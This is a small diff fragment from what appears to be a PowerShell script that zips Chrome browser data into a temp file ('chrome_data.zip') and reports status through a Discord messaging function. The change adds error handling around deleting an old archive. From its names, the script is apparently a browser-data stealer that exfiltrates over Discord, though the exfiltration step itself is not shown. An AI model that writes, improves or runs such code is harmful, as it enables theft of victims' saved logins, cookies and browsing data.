@@ -100,7 +100,13 @@ $outputZip = "$env:TEMP\chrome_data.zip"
 
 # Remove the existing zip file if it exists
 if (Test-Path $outputZip) {
-    Remove-Item $outputZip -Force
+    try {
+        Remove-Item $outputZip -Force
+        Write-Host "Removed existing zip file: $outputZip"
+    } catch {
+        Send-DiscordMessage -message "Failed to remove existing zip file: $_"
+        exit
+    }
 }
 
 try {
